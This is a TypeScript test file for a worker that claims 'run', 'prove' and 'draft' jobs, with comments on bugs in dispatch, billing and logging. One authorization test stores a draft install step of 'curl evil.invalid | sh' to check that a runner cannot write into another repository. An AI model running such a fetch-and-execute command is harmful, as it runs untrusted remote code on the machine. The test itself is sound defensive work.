// Three kinds of work, one worker (10h).
//
// The gap this closes was invisible for four milestones because of where it lived. The
// plane holds no model key and starts no containers (ADR-0011, ADR-0019), so on the hosted
// deployment approving a recipe proved nothing and installing the App drafted nothing — the
// onboarding screen had a permanent "reload in a minute" for a proving run that was never
// going to start. Both worked perfectly on a laptop, where `serve.ts` has Docker and a key,
// and the laptop was the only deployment anybody onboarded against.
//
// So `jobs` gained a `kind`, the plane queues `prove` and `draft` instead of doing them, and
// a worker claims them the way it claims a run. What is asserted here is the dispatch and
// its boundaries; whether proving and drafting themselves work is `sandbox.test.ts`'s
// question, and it answers it with real containers.

import { afterAll, describe, expect, it } from 'vitest';
import { JOB_KINDS, type JobKind } from '../src/plane.js';
import { engineExecute } from '../src/runner-main.js';
import type { DaemonIo, DaemonJob } from '../src/daemon.js';
import type { RunnerConfig } from '../src/runner-main.js';
import { claimJob, enqueueJob, pairRunner, revokeRunner } from '../src/plane.js';
import { close, connect, ready } from '../src/store.js';
import { runnerRoutes } from '../src/runner-api.js';
import { saveRecipe } from '../src/recipe.js';

const CONFIG = {
  planeUrl: 'https://plane.invalid',
  token: 'tfr_x',
  image: 'engine:test',
  agentImage: 'engine-agent:test',
  blobRoot: '/tmp/unused',
  executor: 'docker',
  loop: { provider: 'openrouter', apiKey: 'k', model: 'm', effort: 'low' },
} as unknown as RunnerConfig;

const job = (over: Partial<DaemonJob> = {}): DaemonJob => ({
  runId: '3f1c9a52-7b0e-4d2f-9c41-8a6e5d0b21c7',
  installationId: 1,
  repo: 'acme/widgets',
  intake: { source: 'github_issue', thread_ref: 'acme/widgets#1' },
  recipe: { services: [], test: 'npm test' },
  kind: 'run',
  ...over,
});

/** A typed fake — never a cast, for the reason `runner-main.test.ts` records at length. */
const fakeIo = (over: Partial<DaemonIo> = {}): DaemonIo & { findings: unknown[]; notes: string[] } => {
  const findings: unknown[] = [];
  const notes: string[] = [];
  return {
    findings,
    notes,
    note: (text: string) => void notes.push(text),
    append: async () => {},
    token: async () => 'an-installation-token',
    cost: async () => {},
    secrets: async () => null,
    finding: async (of) => void findings.push(of),
    // `null`: nobody pressed Start on these, so the worker falls back to its own key —
    // which is what a webhook-era job and the local product both do.
    modelKey: async () => null,
    ...over,
  };
  // NO CAST, which is what the comment above this function has claimed since it was
  // written. It ended in `as DaemonIo & { findings: unknown[] }`, and a cast is why
  // `io.note` could be added to `DaemonIo` — and CALLED by the draft path this file
  // tests — while every fake here silently lacked it. A missing member is a runtime
  // `is not a function`, thrown inside the thing under test, which reads as a bug in the
  // code rather than in the fixture.
};

describe('the three kinds are a closed set, and the database agrees', () => {
  it('is exactly run, prove and draft', () => {
    // `db/schema.sql` carries the matching CHECK. Two definitions of what is dispatchable
    // would let the plane queue a kind no worker can claim, which is a job that sits open
    // forever and a repository that never onboards.
    expect([...JOB_KINDS]).toEqual(['run', 'prove', 'draft']);
  });
});

describe('a worker does the thing its job says', () => {
  it('a prove job clones, proves, and sends the proof home — never an event', async () => {
    const io = fakeIo();
    const cloned: string[] = [];
    const proved: unknown[] = [];
    await engineExecute(CONFIG, undefined, undefined, {
      clone: async (remote, into) => void cloned.push(`${remote} -> ${into}`),
      prove: async (plan) => {
        proved.push(plan.recipe);
        return { state: 'ready', provedAt: 'T', caveats: [], unproved: [] } as never;
      },
    })(job({ kind: 'prove' }), io);

    expect(cloned).toHaveLength(1);
    expect(cloned[0]).toContain('acme/widgets');
    // The recipe that travelled with the DISPATCH, read fresh by the plane — so a proof is
    // about what is approved now, not what was approved when the job was queued.
    expect(proved).toEqual([{ services: [], test: 'npm test' }]);
    expect(io.findings).toEqual([{ proof: { state: 'ready', provedAt: 'T', caveats: [], unproved: [] } }]);
  });

  it('a draft job proposes, and what it proposes goes to the drafts table', async () => {
    const io = fakeIo();
    await engineExecute(CONFIG, undefined, undefined, {
      clone: async () => {},
      draft: async () => ({ ok: true, draft: { install: 'npm ci', services: [] } }) as never,
    })(job({ kind: 'draft', recipe: null }), io);

    expect(io.findings).toEqual([{ draft: { install: 'npm ci', services: [] } }]);
  });

  it('and SAYS it proposed something, because the branch that worked said nothing', async () => {
    // The first drafting session that ever succeeded in production wrote a real recipe for
    // `Divy97/portfolio-v2` — its port, its install command, four required secrets — and
    // left `took` and `0 event(s), 0 artifact(s)` in the log with nothing in between.
    // Indistinguishable from the silent FAILURE fixed earlier the same day, and for the
    // same reason: nobody wrote a line for the branch that worked.
    const said: string[] = [];
    const log = console.log;
    console.log = (...parts: unknown[]) => void said.push(parts.map(String).join(' '));
    try {
      await engineExecute(CONFIG, undefined, undefined, {
        clone: async () => {},
        draft: async () =>
          ({
            ok: true,
            draft: { install: 'npm ci', services: [], required: ['TOKEN'] },
            usage: { turns: 12, input_tokens: 40_000, output_tokens: 900 },
          }) as never,
      })(job({ kind: 'draft', recipe: null }), fakeIo());
    } finally {
      console.log = log;
    }

    const all = said.join('\n');
    expect(all).toContain('proposed a recipe for a human to approve');
    // The SHAPE, and what it cost — enough to know the session ended with something in it.
    expect(all).toContain('3 field(s)');
    expect(all).toContain('12 turn(s)');
    expect(all).toContain('40000 in / 900 out');
  });

  it('a drafting session that proposed nothing stores nothing', async () => {
    // An ordinary outcome — the agent explored and had nothing it was willing to propose —
    // and an empty draft would put a box in front of a human saying an agent filled it in.
    const io = fakeIo();
    await engineExecute(CONFIG, undefined, undefined, {
      clone: async () => {},
      // THE WHOLE OUTCOME, not just `ok` and `reason`. A partial one let the worker's
      // failure path read `transcriptText.trim()` off `undefined` — the fixture was lying
      // about a shape the type requires, and the `as never` is what let it.
      draft: async () =>
        ({
          ok: false,
          reason: 'it could not find a test command',
          transcriptText: '',
          usage: { turns: 0, input_tokens: 0, output_tokens: 0, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 },
        }) as never,
    })(job({ kind: 'draft', recipe: null }), io);

    expect(io.findings).toEqual([]);
    // AND SAYS WHY, on the job row, which is where the onboarding screen reads it (10n).
    // Storing nothing was already right; storing nothing SILENTLY left a reader unable to
    // tell "no machine free yet" from "your model key is out of budget" from "this
    // repository has no commits". All three were the same empty box, and they call for
    // three different actions. The reason existed the whole time, in the worker's stdout.
    expect(io.notes).toHaveLength(1);
    expect(io.notes[0]).toContain('No recipe was proposed');
    expect(io.notes[0]).toContain('it could not find a test command');
  });

  it('a prove job for a repository whose recipe was withdrawn does nothing, quietly', async () => {
    // Withdrawn between the approval that queued this and now. Not a failure: there is
    // nothing to prove and nobody to tell, and a proving run that could not start must
    // never look like an approval that did not take.
    const io = fakeIo();
    const proved: unknown[] = [];
    await engineExecute(CONFIG, undefined, undefined, {
      clone: async () => {},
      prove: async () => {
        proved.push(1);
        return {} as never;
      },
    })(job({ kind: 'prove', recipe: null }), io);

    expect(proved).toEqual([]);
    expect(io.findings).toEqual([]);
  });

  it('and a run job is untouched by any of it', async () => {
    // THE control. Every job written before 10h is `kind: 'run'` by the column's default,
    // and this asserts the new branch does not swallow them: `runFromIssue` is reached and
    // neither onboarding path is.
    const io = fakeIo();
    const ran: unknown[] = [];
    const proved: unknown[] = [];
    await engineExecute(CONFIG, undefined, undefined, {
      clone: async () => {},
      prove: async () => {
        proved.push(1);
        return {} as never;
      },
      run: async () => {
        ran.push(1);
        return { runId: 'r', state: {} } as never;
      },
    })(job(), io);

    expect(ran).toHaveLength(1);
    expect(proved).toEqual([]);
    expect(io.findings).toEqual([]);
  });
});

/**
 * The queue, by kind, against a real database.
 *
 * `claimJob` filters in SQL rather than after the fact, and the difference is not cosmetic:
 * a claim that fetched a job and then rejected it in JavaScript would already have written
 * `runner_id` and bumped `dispatches` — it would have DISPATCHED the job to a runner that
 * cannot serve it, and the job would then sit stranded until the two-minute reclaim.
 */
/**
 * Skip, loudly, rather than fail — the house rule from `test/store.test.ts`.
 *
 * AND A SECOND GATE, which is the one worth reading. A test that writes to `jobs` needs a
 * queue nobody else is draining, and `vitest.config.ts` loads `.env` — which on this
 * repository points at the PRODUCTION database, where a live global worker long-polls
 * `/runner/jobs` every 500ms and takes any installation's job of any kind.
 *
 * So this is not flakiness, it is a race with a real worker, and it goes both ways: the test
 * loses jobs it queued, and the worker is handed `acme/kinds-run` — a repository that does
 * not exist — which it dutifully claims, fails to clone, and logs. Verified in the worker's
 * own output while writing this file, alongside `o/r`: `test/plane.test.ts`'s repository,
 * which means **that file's long-standing 10–15 failures are this, not contention with
 * itself.**
 *
 * `ENGINE_TEST_QUEUE=1` is the opt-in, and the right way to set it is a database of your
 * own: `docker compose up -d` and a `DATABASE_URL` pointing at it. Then this is
 * deterministic, and nothing a test queues reaches a machine that will try to run it.
 */
let client: ReturnType<typeof connect> | null = null;
let why = '';
try {
  if (!process.env.DATABASE_URL) why = 'DATABASE_URL is not set (copy .env.example to .env)';
  else if (process.env.ENGINE_TEST_QUEUE !== '1') {
    why =
      'this test writes to `jobs`, and a live worker drains the queue that `.env` points at — ' +
      'set ENGINE_TEST_QUEUE=1 against a database of your own (`docker compose up -d`)';
  } else client = connect();
} catch (error) {
  why = String(error);
}
if (why) console.log(`SKIPPED (the job queue): ${why}`);

describe('a runner takes the kinds it asked for and no others', () => {
  const made: { runs: string[]; runners: string[] } = { runs: [], runners: [] };
  afterAll(async () => {
    if (!client) return;
    await client.query('delete from jobs where run_id = any($1)', [made.runs]).catch(() => {});
    for (const id of made.runners) {
      await revokeRunner(client, id, 424243).catch(() => {});
      await revokeRunner(client, id, 424244).catch(() => {});
    }
    await client.query('delete from runners where id = any($1)', [made.runners]).catch(() => {});
    // NOT `close(client)`. The pool is shared by every describe in this file, and closing it
    // here left the ones below with "Cannot use a pool after calling end on the pool" — a
    // failure that reads as a database problem and is a teardown ordering problem. It is
    // closed once, at the bottom of the file.
  });

  /** An installation of its own, so these jobs cannot be taken by anything else running. */
  const INSTALLATION = 424243;

  const queue = async (kind: JobKind) => {
    const runId = await enqueueJob(client!, {
      installationId: INSTALLATION,
      repo: `acme/kinds-${kind}`,
      intake: { kind },
      kind,
    });
    made.runs.push(runId);
    return runId;
  };

  it('claims only the kind it named, and leaves the rest queued', async () => {
    if (!client) return void console.log(`SKIPPED (the job queue): ${why}`);
    await ready(client);
    const runJob = await queue('run');
    const proveJob = await queue('prove');

    const { runner } = await pairRunner(client, { installationId: INSTALLATION, name: 'kinds-test' });
    made.runners.push(runner.id);

    // Asks for `prove` only — and gets the prove job, not the run job that was queued
    // FIRST. `order by queued_at` would have handed over the run without the filter.
    const claimed = await claimJob(client, runner, { kinds: ['prove'] });
    expect(claimed?.runId).toBe(proveJob);
    expect(claimed?.kind).toBe('prove');

    // And the run job was not touched — not claimed, not dispatched, not counted.
    const { rows } = await client.query('select runner_id, dispatches from jobs where run_id = $1', [runJob]);
    expect(rows[0]!.runner_id).toBeNull();
    expect(Number(rows[0]!.dispatches)).toBe(0);
  });

  it('and a runner that names nothing takes any of them, which is what every older one does', async () => {
    if (!client) return void console.log(`SKIPPED (the job queue): ${why}`);
    // ITS OWN INSTALLATION, and the queue drained before the assertion.
    //
    // The first version of this asked only "did it claim something" on the shared
    // installation above, which the previous test had already left a `run` job on — so it
    // passed or failed depending on the order two tests ran in, against a database this
    // suite shares with itself. A test whose subject is "the default takes any kind" has to
    // control what kinds are there.
    const alone = 424244;
    const drained: string[] = [];
    const { runner } = await pairRunner(client, { installationId: alone, name: 'kinds-test-any' });
    made.runners.push(runner.id);
    // Anything left from an earlier interrupted run of this file.
    for (let i = 0; i < 10; i += 1) {
      const stale = await claimJob(client, runner);
      if (!stale) break;
      drained.push(stale.runId);
      await client.query('update jobs set finished_at = now() where run_id = $1', [stale.runId]);
    }

    const draftJob = await enqueueJob(client, {
      installationId: alone,
      repo: 'acme/kinds-any',
      intake: { kind: 'draft' },
      kind: 'draft',
    });
    made.runs.push(draftJob);

    const claimed = await claimJob(client, runner);
    // The `draft` job specifically — a runner that names no kinds gets one it never asked
    // for, which is the pre-10h behaviour kept by defaulting to all three rather than by a
    // special case.
    expect(claimed?.runId).toBe(draftJob);
    expect(claimed?.kind).toBe('draft');
    expect(JOB_KINDS).toContain(claimed!.kind);
  });

  it('the kind survives the round trip, so a worker does what was queued', async () => {
    if (!client) return void console.log(`SKIPPED (the job queue): ${why}`);
    const id = await queue('draft');
    const { runner } = await pairRunner(client, { installationId: INSTALLATION, name: 'kinds-test-rt' });
    made.runners.push(runner.id);
    const claimed = await claimJob(client, runner, { kinds: ['draft'] });
    expect(claimed?.runId).toBe(id);
    // THE assertion. Without `kind` on the returning clause the worker would default it to
    // `run` and re-explore a repository as though somebody had reported a bug in it.
    expect(claimed?.kind).toBe('draft');
  });
});

/**
 * Whose key pays for a run.
 *
 * `POST /api/runs` has refused a person with no stored key since 10k — 412, "no model key" —
 * and the plane has answered `/runner/runs/:id/model-key` since then too. **Nothing asked
 * it.** So the check had no consequence: a person stored a key, was told it would be spent
 * on their runs, and the worker spent its own `OPENROUTER_API_KEY` instead. The operator's
 * account paid for strangers' runs, and nothing anywhere said so.
 */
describe('a run spends the key of whoever pressed Start', () => {
  const loopOf = async (billed: { provider: string; key: string } | null) => {
    let seen: unknown;
    const io = fakeIo({ modelKey: async () => billed });
    await engineExecute(CONFIG, undefined, undefined, {
      clone: async () => {},
      run: async (request) => {
        seen = (request as { loop?: unknown }).loop;
        return { runId: 'r', state: {} } as never;
      },
    })(job(), io);
    return seen as { provider: string; apiKey: string; model: string };
  };

  it('theirs, when the plane names one', async () => {
    const loop = await loopOf({ provider: 'anthropic', key: 'sk-ant-theirs' });
    // `apiKey`, which is what `runAgentLoop` reads. `modelKey()` answers `key`, and a spread
    // of one onto the other added a field nothing reads and kept spending the operator's
    // account — passing every other assertion here while doing so.
    expect(loop.apiKey).toBe('sk-ant-theirs');
    // The PROVIDER travels with the key. A key for one provider spent through another's
    // wire format is a run that does nothing and reports it as a finding about the bug —
    // `default-provider-is-openrouter` is the same trap from the fixture side.
    expect(loop.provider).toBe('anthropic');
    // And the rest of this worker's configuration survives: the model and effort are the
    // operator's choice, not the payer's.
    expect(loop.model).toBe('m');
  });

  it("the worker's own, when there is nobody to bill", async () => {
    // A webhook-era job, and every run on the local product. This is what every run did
    // before the button existed and it must keep working.
    const loop = await loopOf(null);
    expect(loop.apiKey).toBe('k');
    expect(loop.provider).toBe('openrouter');
  });

  it('and a plane that will not answer stops the run rather than billing the wrong account', async () => {
    // Falling back on a transport error is the failure this method exists to fix: it spends
    // the operator's key silently, which is indistinguishable from working.
    const io = fakeIo({
      modelKey: async () => {
        throw new Error('the plane would not hand over the model key: HTTP 500');
      },
    });
    await expect(
      engineExecute(CONFIG, undefined, undefined, { clone: async () => {}, run: async () => ({}) as never })(
        job(),
        io,
      ),
    ).rejects.toThrow(/model key/);
  });
});

/**
 * What comes home from a prove or draft job, and what a bad one costs.
 *
 * `POST /runner/runs/:id/finding` is the one route on the runner surface that stores
 * something which is not an event. Its first version called `parseRecipe` on a draft and
 * answered 400 when it failed — which made `io.finding` throw, left the job open, and
 * re-dispatched it up to `MAX_DISPATCHES`: **five drafting sessions against the same
 * repository, each producing the same unparseable proposal**, for a failure retrying cannot
 * fix. `draftRecipe` returns `draft: unknown` and documents that `parseRecipe` belongs at
 * the point a human is shown the result, which is where `Environment.tsx` already runs it.
 */
describe('a finding comes home, and a bad draft is not retried five times', () => {
  const made: { runs: string[]; runners: string[] } = { runs: [], runners: [] };
  const REPO = 'acme/finding-test';
  const INSTALLATION = 424245;

  afterAll(async () => {
    if (!client) return;
    await client.query('delete from jobs where run_id = any($1)', [made.runs]).catch(() => {});
    await client.query('delete from recipe_drafts where repo = $1', [REPO]).catch(() => {});
    await client.query('delete from recipes where repo = $1', [REPO]).catch(() => {});
    await client.query('delete from runners where id = any($1)', [made.runners]).catch(() => {});
  });

  /** A claimed draft job, and a way to POST a finding for it as its runner. */
  const heldJob = async (kind: JobKind) => {
    const runId = await enqueueJob(client!, {
      installationId: INSTALLATION,
      repo: REPO,
      intake: { kind },
      kind,
    });
    made.runs.push(runId);
    const { runner, token } = await pairRunner(client!, { installationId: INSTALLATION, name: `finding-${kind}` });
    made.runners.push(runner.id);
    // Claimed, because `appendFromRunner` authorizes on the run this runner HOLDS.
    const claimed = await claimJob(client!, runner, { kinds: [kind] });
    const routes = runnerRoutes({ client: client!, blobRoot: '/tmp' });
    const post = (body: unknown) =>
      routes({
        method: 'POST',
        path: `/runner/runs/${runId}/finding`,
        query: new URLSearchParams(),
        headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
        body: async () => JSON.stringify(body),
        raw: async () => Buffer.from(JSON.stringify(body)),
      });
    return { runId, post, claimed };
  };

  it('a proof lands where the onboarding screen reads it', async () => {
    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
    await ready(client);
    // A RECIPE FIRST, because `saveProof` is an `update` — a proof is a fact ABOUT an
    // approved recipe, so there is nothing to attach one to without it. That is also true
    // on the real path: a `prove` job only exists because somebody approved something, and
    // `onboardingJob` returns early when the recipe has been withdrawn since.
    await saveRecipe(client, REPO, { install: 'npm ci', services: [], test: 'npm test' });
    const { post } = await heldJob('prove');
    const answer = await post({ proof: { state: 'ready', provedAt: 'T', caveats: [], unproved: [] } });
    expect(answer?.status).toBe(200);
    const { rows } = await client.query(`select proof->>'state' as state from recipes where repo = $1`, [REPO]);
    expect(rows[0]?.state).toBe('ready');
  });

  it('AN UNPARSEABLE DRAFT IS STORED, not rejected — the human is the control', async () => {
    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
    // What an untrusted agent actually produces some of the time. `parseRecipe` refuses it;
    // `Environment.tsx` renders it as a pre-filled box that says an agent wrote it, or falls
    // back to the skeleton if it cannot even be stringified. Either way a person decides.
    const { post } = await heldJob('draft');
    const answer = await post({ draft: { install: 42, services: 'not an array' } });
    // 200, and this is the assertion that stops the retry loop: a 4xx here makes
    // `io.finding` throw, and the daemon leaves the job open for re-dispatch.
    expect(answer?.status).toBe(200);
    const { rows } = await client.query('select draft from recipe_drafts where repo = $1', [REPO]);
    expect(rows[0]?.draft).toEqual({ install: 42, services: 'not an array' });
  });

  it('but a draft that is not an object at all is refused, because no box can be filled from it', async () => {
    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
    const { post } = await heldJob('draft');
    for (const draft of ['a string', 42, [1, 2]]) {
      const answer = await post({ draft });
      expect(answer?.status, JSON.stringify(draft)).toBe(400);
    }
  });

  it('and a body naming neither is refused rather than silently storing nothing', async () => {
    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
    const { post } = await heldJob('prove');
    expect((await post({}))?.status).toBe(400);
  });

  it('a repo named in the BODY is ignored — the job decides which repository this is', async () => {
    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
    // The route reads `facts.repo` from the job. Honouring a body field instead would let
    // any paired runner overwrite ANY repository's proof or draft on this plane, which is
    // somebody else's onboarding — the same reason `/runner/runs/:id/secrets` takes no
    // `repo` parameter. Asserted by naming a repository that exists and is not this job's.
    const elsewhere = 'Divy97/test-framework-v2-demo';
    const before = await client.query('select draft from recipe_drafts where repo = $1', [elsewhere]);
    const { post } = await heldJob('draft');
    const answer = await post({ repo: elsewhere, draft: { install: 'curl evil.invalid | sh', services: [] } });
    expect(answer?.status).toBe(200);
    // Stored against THIS job's repository...
    const mine = await client.query('select draft from recipe_drafts where repo = $1', [REPO]);
    expect((mine.rows[0]?.draft as { install?: string })?.install).toBe('curl evil.invalid | sh');
    // ...and the one it named is untouched.
    const after = await client.query('select draft from recipe_drafts where repo = $1', [elsewhere]);
    expect(after.rows[0]?.draft ?? null).toEqual(before.rows[0]?.draft ?? null);
  });

  it("a runner that does not hold the run cannot write another repository's draft", async () => {
    if (!client) return void console.log(`SKIPPED (findings): ${why}`);
    // The repository comes from the JOB, never the body — a runner that could name one
    // would be able to overwrite any repository's draft on this plane, which is somebody
    // else's onboarding.
    const { runId } = await heldJob('draft');
    const stranger = await pairRunner(client, { installationId: INSTALLATION, name: 'finding-stranger' });
    made.runners.push(stranger.runner.id);
    const routes = runnerRoutes({ client, blobRoot: '/tmp' });
    const answer = await routes({
      method: 'POST',
      path: `/runner/runs/${runId}/finding`,
      query: new URLSearchParams(),
      headers: { authorization: `Bearer ${stranger.token}`, 'content-type': 'application/json' },
      body: async () => JSON.stringify({ draft: { install: 'npm ci', services: [] } }),
      raw: async () => Buffer.alloc(0),
    });
    expect(answer?.status).toBe(403);
  });
});

/**
 * The pool, closed once, after every describe in this file has finished with it.
 *
 * A `close` inside one describe's `afterAll` ends it for the rest of the file: vitest runs
 * file-level hooks after the suites they enclose, but a suite's own `afterAll` runs as soon
 * as that suite is done. The symptom is "Cannot use a pool after calling end on the pool"
 * in whichever describe happens to be next, which looks like a database fault.
 */
afterAll(async () => {
  if (client) await close(client);
});

/**
 * A drafting session that proposes nothing has to say so.
 *
 * A real `draft` job in production finished in 37 seconds having stored nothing, and the
 * only trace was `0 event(s), 0 artifact(s)`. From the outside — somebody who has just
 * installed the App on a new repository and is looking at an empty recipe box — that is
 * indistinguishable from a job that never ran, and there is nothing to act on either way.
 * `serve.ts` has logged the reason since 8f; `onboardingJob` returned silently.
 */
describe('a drafting session that proposes nothing says why', () => {
  const said: string[] = [];
  const spy = () => {
    const real = console.log;
    said.length = 0;
    console.log = (...parts: unknown[]) => void said.push(parts.join(' '));
    return () => void (console.log = real);
  };

  it('names the reason, quotes the transcript, and reports what it spent', async () => {
    const restore = spy();
    try {
      await engineExecute(CONFIG, undefined, undefined, {
        clone: async () => {},
        draft: async () =>
          ({
            ok: false,
            reason: 'it could not find a test command',
            transcriptText: 'I looked at package.json and there are no scripts.',
            usage: { turns: 7, input_tokens: 4210, output_tokens: 180, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 },
          }) as never,
      })(job({ kind: 'draft', recipe: null }), fakeIo());
    } finally {
      restore();
    }
    const all = said.join('\n');
    expect(all).toMatch(/drafting produced nothing — it could not find a test command/);
    // The transcript, because it is the only account of what the agent was doing — and the
    // whole question when a session proposes nothing is what it was looking at.
    expect(all).toMatch(/no scripts/);
    // And the cost, because a session that produced nothing still spent tokens.
    expect(all).toMatch(/7 turn\(s\), 4210 in \/ 180 out/);
  });

  it('and a session that DID propose something logs no such thing', async () => {
    // The control. Without it, the assertion above passes on a worker that reports failure
    // unconditionally.
    const restore = spy();
    const io = fakeIo();
    try {
      await engineExecute(CONFIG, undefined, undefined, {
        clone: async () => {},
        draft: async () => ({ ok: true, draft: { install: 'npm ci', services: [] } }) as never,
      })(job({ kind: 'draft', recipe: null }), io);
    } finally {
      restore();
    }
    expect(said.join('\n')).not.toMatch(/produced nothing/);
    expect(io.findings).toEqual([{ draft: { install: 'npm ci', services: [] } }]);
  });
});
